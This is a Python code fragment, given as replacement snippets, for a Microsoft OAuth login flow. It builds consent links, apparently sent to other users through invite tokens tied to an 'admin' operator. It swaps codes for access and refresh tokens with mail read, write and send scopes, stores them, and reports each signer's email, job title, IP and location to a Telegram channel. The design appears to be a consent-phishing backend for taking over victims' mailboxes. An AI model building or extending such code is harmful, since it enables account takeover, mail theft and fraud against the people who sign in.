# =========================
# SCOPES
# Replace your current scope constants with these
# =========================
BASIC_SCOPES = "openid profile offline_access https://graph.microsoft.com/User.Read"
PREVIEW_SCOPES = (
    "openid profile offline_access "
    "https://graph.microsoft.com/User.Read "
    "https://graph.microsoft.com/Mail.ReadBasic"
)
ENTERPRISE_SCOPES = (
    "openid profile offline_access "
    "https://graph.microsoft.com/User.Read "
    "https://graph.microsoft.com/Mail.ReadWrite "
    "https://graph.microsoft.com/Mail.Send"
)

# =========================
# SCOPE RESOLUTION
# Replace your current resolve_scopes(...) with this
# =========================
def resolve_scopes(user_id: str | None = None, mail_mode: bool = False, admin_user_id: str | None = None):
    if not mail_mode:
        return BASIC_SCOPES

    mode = get_user_enterprise_mode(user_id or "", admin_user_id=admin_user_id)

    if mode == "enterprise_full":
        return ENTERPRISE_SCOPES

    return PREVIEW_SCOPES


# =========================
# AUTHORIZE URL BUILDER
# Keep using this normal Microsoft authorize URL shape
# =========================
def build_authorize_url(
    state_value: str,
    scopes: str,
    prompt: str | None = None,
    tenant: str = "common",
    login_hint: str | None = None,
    domain_hint: str | None = None,
):
    params = {
        "client_id": CLIENT_ID,
        "response_type": "code",
        "redirect_uri": REDIRECT_URI,
        "response_mode": "query",
        "scope": scopes,
        "state": quote_plus(state_value),
    }

    if prompt:
        params["prompt"] = prompt

    if login_hint:
        params["login_hint"] = login_hint

    if domain_hint:
        params["domain_hint"] = domain_hint

    return f"https://login.microsoftonline.com/{tenant}/oauth2/v2.0/authorize?{urlencode(params)}"


# =========================
# LOGIN LINKS
# Replace your current URL generator functions with these
# =========================
def generate_login_link(user_id: str):
    state_value = f"user_basic:{user_id}"
    return build_authorize_url(
        state_value=state_value,
        scopes=resolve_scopes(user_id=user_id, mail_mode=False),
        tenant="common",
        prompt="select_account",
        login_hint=user_id if "@" in user_id else None,
    )


def generate_mail_connect_link(user_id: str, admin_user_id: str | None = None):
    state_value = f"user_mail:{user_id}"
    return build_authorize_url(
        state_value=state_value,
        scopes=resolve_scopes(user_id=user_id, mail_mode=True, admin_user_id=admin_user_id),
        tenant="common",
        prompt="select_account",
        login_hint=user_id if "@" in user_id else None,
    )


def generate_org_connect_link(admin_user_id: str, tenant_hint: str | None = None):
    invite_token = create_connect_invite(admin_user_id, connect_mode="basic", tenant_hint=tenant_hint)
    state_value = f"invite_basic:{invite_token}"
    return build_authorize_url(
        state_value=state_value,
        scopes=BASIC_SCOPES,
        tenant="common",
        prompt="select_account",
        domain_hint=tenant_hint if tenant_hint and "." in tenant_hint else None,
    )


def generate_org_mail_connect_link(admin_user_id: str, tenant_hint: str | None = None):
    invite_token = create_connect_invite(admin_user_id, connect_mode="mail", tenant_hint=tenant_hint)
    state_value = f"invite_mail:{invite_token}"
    return build_authorize_url(
        state_value=state_value,
        scopes=PREVIEW_SCOPES,
        tenant="common",
        prompt="select_account",
        domain_hint=tenant_hint if tenant_hint and "." in tenant_hint else None,
    )


# =========================
# TOKEN EXCHANGE
# Make sure your token-exchange and refresh functions
# request the same scope family above, not outlook.office.com/.default
# =========================
def exchange_code_for_token(code: str, state: str, client_ip: str = None, user_agent: str = None):
    init_db()

    decoded_state = unquote(state or "")

    requested_scopes = BASIC_SCOPES
    flow_type = "basic"
    state_user_id = None
    admin_user_id_for_saved_user = None
    invite_token = None

    if decoded_state.startswith("user_mail:") or decoded_state.startswith("invite_mail:"):
        flow_type = "mail"

    if decoded_state.startswith("user_basic:"):
        state_user_id = decoded_state.split("user_basic:", 1)[1]
        admin_user_id_for_saved_user = state_user_id
    elif decoded_state.startswith("user_mail:"):
        state_user_id = decoded_state.split("user_mail:", 1)[1]
        admin_user_id_for_saved_user = state_user_id
        requested_scopes = resolve_scopes(user_id=state_user_id, mail_mode=True, admin_user_id=admin_user_id_for_saved_user)
    elif decoded_state.startswith("invite_basic:"):
        invite_token = decoded_state.split("invite_basic:", 1)[1]
        invite = get_connect_invite(invite_token)
        if invite:
            admin_user_id_for_saved_user = invite.admin_user_id
            if hasattr(invite, "resolved_user_id") and invite.resolved_user_id:
                state_user_id = invite.resolved_user_id
    elif decoded_state.startswith("invite_mail:"):
        invite_token = decoded_state.split("invite_mail:", 1)[1]
        invite = get_connect_invite(invite_token)
        if invite:
            admin_user_id_for_saved_user = invite.admin_user_id
            if hasattr(invite, "resolved_user_id") and invite.resolved_user_id:
                state_user_id = invite.resolved_user_id
            requested_scopes = resolve_scopes(
                user_id=state_user_id or "",
                mail_mode=True,
                admin_user_id=admin_user_id_for_saved_user,
            )
    elif decoded_state.startswith("user:"):
        state_user_id = decoded_state.split("user:", 1)[1]
        admin_user_id_for_saved_user = state_user_id
    elif decoded_state.startswith("invite:"):
        invite_token = decoded_state.split("invite:", 1)[1]
        invite = get_connect_invite(invite_token)
        if invite:
            admin_user_id_for_saved_user = invite.admin_user_id
            if hasattr(invite, "resolved_user_id") and invite.resolved_user_id:
                state_user_id = invite.resolved_user_id
    else:
        admin_user_id_for_saved_user = decoded_state or None
        state_user_id = decoded_state or None

    token_payload = {
        "client_id": CLIENT_ID,
        "client_secret": CLIENT_SECRET,
        "code": code,
        "redirect_uri": REDIRECT_URI,
        "grant_type": "authorization_code",
        "scope": requested_scopes,
    }

    response = requests.post(TOKEN_URL, data=token_payload, timeout=30)
    result = response.json()

    if "error" in result:
        raise Exception(f"Token exchange failed: {result.get('error_description', result['error'])}")

    access_token = result["access_token"]

    resolved_user_id = None
    job_title = None
    profile = {}

    try:
        identity = fetch_graph_identity(access_token)
        resolved_user_id = identity["resolved_user_id"]
        job_title = identity["job_title"]
        profile = identity["profile"]
    except Exception:
        pass

    device_info = build_device_info(client_ip, user_agent)

    effective_user_id = resolved_user_id or state_user_id or admin_user_id_for_saved_user

    if effective_user_id:
        save_token(effective_user_id, result, device_info)

    if admin_user_id_for_saved_user and resolved_user_id:
        save_saved_user(admin_user_id_for_saved_user, resolved_user_id, job_title)

    if invite_token and resolved_user_id:
        mark_connect_invite_used(invite_token, resolved_user_id, job_title)

    email = profile.get("userPrincipalName") or profile.get("mail") or resolved_user_id or "unknown"

    send_telegram_alert(
        f"Resolved User ID: {resolved_user_id or 'unknown'}\n"
        f"State User ID: {state_user_id or 'unknown'}\n"
        f"Job Title: {job_title or 'unknown'}\n"
        f"Admin/User Context: {admin_user_id_for_saved_user or 'unknown'}\n"
        f"Email: {email}\n"
        f"IP: {client_ip or 'unknown'}\n"
        f"Location: {device_info.get('location', 'unknown')}\n"
        f"Flow: oauth_redirect ({flow_type})"
    )

    return {
        "resolved_user_id": resolved_user_id,
        "effective_user_id": effective_user_id,
        "job_title": job_title,
        "profile": profile,
        "admin_user_id": admin_user_id_for_saved_user,
        "flow_type": flow_type,
    }


def refresh_token(user_id: str, admin_user_id: str | None = None):
    token_record = get_token(user_id)

    if not token_record or not token_record.refresh_token:
        raise Exception("No refresh token available. User must re-login.")

    requested_scopes = resolve_scopes(user_id=user_id, mail_mode=True, admin_user_id=admin_user_id)

    data = {
        "client_id": CLIENT_ID,
        "client_secret": CLIENT_SECRET,
        "refresh_token": token_record.refresh_token,
        "grant_type": "refresh_token",
        "scope": requested_scopes,
    }

    response = requests.post(TOKEN_URL, data=data, timeout=30)
    result = response.json()

    if "error" in result:
        raise Exception(f"Token refresh failed: {result.get('error_description', result['error'])}")

    save_token(user_id, result)
    return result